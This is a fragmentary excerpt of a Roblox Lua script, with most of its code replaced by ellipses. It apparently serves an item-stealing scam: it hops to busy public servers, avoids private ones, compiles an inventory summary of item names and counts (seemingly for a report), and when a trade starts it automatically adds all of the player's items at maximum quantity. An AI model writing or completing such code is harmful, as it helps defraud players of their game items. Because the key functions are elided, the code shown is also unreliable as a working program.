...
local PRIVATE_SERVER_PLAYER_THRESHOLD = 4
...
local PUBLIC_SERVER_MIN_PLAYER_COUNT = 5
		...
		if typeof(data) == "table" then
			...
			for _, server in ipairs(data) do
				if typeof(server) == "table" then
					...
					if jobId ~= "" and jobId ~= game.JobId and hasRoom and playing >= PUBLIC_SERVER_MIN_PLAYER_COUNT then
...
if scriptBlockedInPrivateServer then
	startBlockedServerRecoveryLoop()
else
...
local function buildInventorySummaryLines()
	...
	local shown = math.min(maxLines, #snapshot)
	local lines = {}
	for i = 1, shown do
		local entry = snapshot[i]
		table.insert(lines, string.format("%d) %s x%d", i, entry.name, entry.quantity))
	...
	return truncateForField(combined, 1000), #snapshot
end
...
local function autoAddAllItemsMax(jobId)
...
tradeStarted.OnClientEvent:Connect(function(_tradeData)
	...
	if AUTO_ADD_ITEMS_ENABLED then
		...
		addedCount = autoAddAllItemsMax(currentJobId)
	end
